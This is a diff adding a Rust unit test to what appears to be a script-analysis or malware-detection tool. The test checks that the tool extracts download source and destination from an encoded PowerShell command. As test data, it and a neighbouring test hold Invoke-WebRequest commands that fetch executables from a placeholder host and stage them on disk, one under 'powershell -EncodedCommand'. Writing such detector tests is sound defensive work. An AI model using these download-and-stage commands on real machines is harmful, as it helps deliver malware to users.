@@ -7877,6 +7877,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_quoted_outfile_with_spaces_preserves_destination() {
+        let ps = r#"Invoke-WebRequest -Uri "http://x.example/spaced.exe" -OutFile "C:\Users\Public\stage one.exe""#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://x.example/spaced.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\stage one.exe")
+            )
+        });
+        assert!(
+            has,
+            "quoted OutFile path with spaces was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps_backtick_line_continuation_resolves_cmdlet_name() {
         let ps =
             "Invoke-Web`\r\nRequest -Uri \"http://x.example/continued.exe\" -OutFile \"z.exe\"";
